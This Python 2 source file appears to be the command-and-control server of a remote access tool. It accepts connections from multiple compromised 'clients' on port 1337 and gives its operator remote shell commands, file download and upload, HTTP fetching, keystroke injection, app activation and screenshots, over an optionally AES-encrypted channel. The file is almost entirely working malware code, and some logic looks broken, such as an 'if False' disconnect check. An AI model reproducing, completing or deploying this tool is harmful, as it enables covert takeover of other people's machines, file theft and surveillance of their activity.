import os
import sys
import time
import socket
import subprocess
import base64
from Crypto.Cipher import AES
from classes import Client
from modules.execShell import execShell
from modules.server import clear, setup, refresh, removeSock, helpMessage, wrongArgumentNumber

active = False
clients = []
socks = []

server = setup(port=1337)
while True:
    # display clients
    refresh(socks)
    # listen for clients
    try:
        server.settimeout(1)
        # accept connection
        try:
            s, a = server.accept()
        except socket.timeout:
            continue
        # add socket
        if (s):
            s.settimeout(None)
            socks += [s]
            clients += [str(a)]
    except KeyboardInterrupt:
        # display clients
        refresh(socks)
        # accept selection ... int 0/1-128
        activate = input('\nEnter option: ')
        # exit
        if activate == 0:
            print '\nExiting...\n'
            for i in range(len(socks)):
                socks[i].close()
            sys.exit()
        # subtract 1 (array starts at 0)
        activate -= 1
        # clear screen
        clear()
        # creating new client object
        client = Client(socks[activate])
        print '\nActivating client ' + clients[activate] + ''
        active = True
        client.send('Activate')
        outputIsComing = True

    while active:
        if 1 == 1:
            # receive data
            if outputIsComing:
                try:
                    data = client.receive()
                except KeyboardInterrupt:
                    active = False
                    break
            else:
                data = 'no output anyway'
                outputIsComing = True
        # client disconnected
        if False:
            print '\nClient disconnected... ' + clients[activate]
            # remove client
            socks, clients, active = removeSock(socks, clients, activate)
            del client
            break
        # exit client
        if data == 'quitted':
            print 'Exit.\n'
            # remove client
            socks, clients, active = removeSock(socks, clients, activate)
            del client
            break
        # data exists
        if data != '' and data != 'no output anyway':
            sys.stdout.write(data)
        # prompt
        client.send('get current dir')
        currentDir = client.receive()
        command = raw_input('\n[[' + socks[activate].getpeername()[0] + ']' + currentDir + ']:')
        # download
        if command.startswith('download'):
            if wrongArgumentNumber(command):
                print helpMessage('download')
                outputIsComing = False
            elif len(command.split(' ')) == 2:
                client.download(command.split(' ')[1])
            else:
                client.download(command.split(' ')[1], command.split(' ')[2])
        # upload
        elif command.startswith('upload'):
            if wrongArgumentNumber(command):
                print helpMessage('upload')
                outputIsComing = False
            elif len(command.split(' ')) == 2:
                client.upload(command.split(' ')[1])
            else:
                client.upload(command.split(' ')[1], command.split(' ')[2])
        # encryption setting
        elif command.startswith('encryption'):
            if wrongArgumentNumber(command, min=2, max=2):
                print helpMessage('encryption')
            # turn encryption on
            if command.split(' ')[1] == 'on':
                client.send('encryption on')
                client.encryption = True
                print 'Encryption is on'
            # turn encryption off
            elif command.split(' ')[1] == 'off':
                client.send('encryption off')
                client.encryption = False
                print 'Encryption is off'
            # print encryption status on|off
            elif command.split(' ')[1] == 'status':
                if client.encryption:
                    print 'Encryption is enabled'
                else:
                    print 'Encryption is disabled'
            outputIsComing = False
        elif command.startswith('downHTTP') or command.startswith('downhttp') and wrongArgumentNumber(command):
            print helpMessage('downHTTP')
            outputIsComing = False
        elif command.split(' ')[0] in ['sendKeys', 'sendkeys'] and wrongArgumentNumber(command, min=2, max=2):
            print helpMessage('sendKeys')
            outputIsComing = False
        elif command.split(' ')[0] in ['activateApp', 'activateapp'] and wrongArgumentNumber(command, min=2, max=2):
            print helpMessage('activateApp')
            outputIsComing = False
        elif command.startswith('screenshot') and wrongArgumentNumber(command, min=1, max=1):
            print helpMessage('screenshot')
            outputIsComing = False
        # clear screen
        elif command.startswith('clear') or command.startswith('cls'):
            clear()
            outputIsComing = False
        # execute command on server
        elif command.startswith('_'):
            print execShell(command[1:])
            outputIsComing = False
        # normal command
        elif command != '':
            client.send(command)
        else:
            outputIsComing = False
